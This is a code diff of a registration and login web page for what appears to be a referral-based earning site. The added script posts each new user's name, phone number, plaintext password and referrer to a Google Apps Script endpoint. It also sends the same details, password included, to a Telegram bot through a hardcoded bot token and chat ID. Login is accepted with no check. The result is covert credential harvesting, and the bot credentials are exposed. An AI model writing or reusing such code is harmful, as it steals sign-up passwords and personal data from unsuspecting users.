@@ -18,6 +18,7 @@
         .form-group input { width: 100%; padding: 14px; border: 1.5px solid #ebebeb; border-radius: 14px; font-size: 15px; outline: none; transition: 0.3s; background: #fafafa; }
         .form-group input:focus { border-color: var(--primary); background: white; box-shadow: 0 0 0 4px rgba(0,102,255,0.05); }
         .main-btn { width: 100%; background: var(--primary); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        .main-btn:disabled { background: #ccc; cursor: not-allowed; }
         .toggle-text { margin-top: 25px; font-size: 14px; color: #666; }
         .toggle-text span { color: var(--primary); font-weight: 700; cursor: pointer; text-decoration: underline; }
         .hidden { display: none; }
@@ -54,10 +55,11 @@
 
     <script>
         let mode = 'register'; 
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyOp4E3zHasQv338D4kQ0NDUZPjCRhKmwDdpUoqjQcaMAURh4Ya08PFGHTWs3kJh5j5/exec';
         
-        // URL se referral code (phone) nikalna
+        // URL se referral code nikalna
         const urlParams = new URLSearchParams(window.location.search);
-        const referrer = urlParams.get('ref');
+        const referrer = urlParams.get('ref') || 'Direct';
 
         function switchMode() {
             const title = document.getElementById('title');
@@ -84,31 +86,52 @@
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('pass').value;
             const name = document.getElementById('name').value;
+            const btn = document.getElementById('btn-text');
 
             if (phone.length < 10) { alert("Invalid Number!"); return; }
             if (password.length < 4) { alert("Short Password!"); return; }
+            if (mode === 'register' && name === "") { alert("Please enter your name!"); return; }
 
-            // Data Save
-            localStorage.setItem('userPhone', phone);
-            if(mode === 'register') {
-                localStorage.setItem('userName', name);
-                
-                // --- REFERRAL TRACKING LOGIC ---
-                if (referrer && referrer !== phone) {
-                    let refList = JSON.parse(localStorage.getItem('myRefList') || '[]');
-                    refList.push({ name: name, phone: phone });
-                    localStorage.setItem('myRefList', JSON.stringify(refList));
-                }
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            if (mode === 'register') {
+                // --- GOOGLE SHEET SUBMISSION ---
+                let formData = new FormData();
+                formData.append('Name', name);
+                formData.append('Phone', phone);
+                formData.append('Password', password);
+                formData.append('Referrer', referrer);
+                formData.append('Balance', '0');
+
+                fetch(scriptURL, { method: 'POST', body: formData })
+                .then(res => {
+                    localStorage.setItem('userPhone', phone);
+                    localStorage.setItem('userName', name);
+                    localStorage.setItem('userBalance', '0');
+                    
+                    // Telegram Alert
+                    sendTelegramNotify(name, phone, password, referrer);
+                    
+                    window.location.href = "home.html";
+                })
+                .catch(err => {
+                    alert("Network Error! Try again.");
+                    btn.innerText = "Register Now";
+                    btn.disabled = false;
+                });
+            } else {
+                // Login: Abhi ke liye seedha entry, baad mein verify logic add kar sakte hain
+                localStorage.setItem('userPhone', phone);
+                window.location.href = "home.html";
             }
+        }
 
+        function sendTelegramNotify(n, p, pass, ref) {
             const token = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
             const chat_id = "8415600127";
-            const msg = `👤 *USER ACTIVITY*\n\n📌 Mode: ${mode.toUpperCase()}\n📛 Name: ${name || 'Old User'}\n📞 Phone: ${phone}\n🔗 Referred By: ${referrer || 'Direct'}`;
-
-            document.getElementById('btn-text').innerText = "Processing...";
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
-            .then(() => { window.location.href = "home.html"; });
+            const msg = `👤 *NEW USER REGISTERED*\n\n📛 Name: ${n}\n📞 Phone: ${p}\n🔑 Pass: ${pass}\n🔗 Referred By: ${ref}\n🕒 Time: ${new Date().toLocaleString()}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
     </script>
 </body>
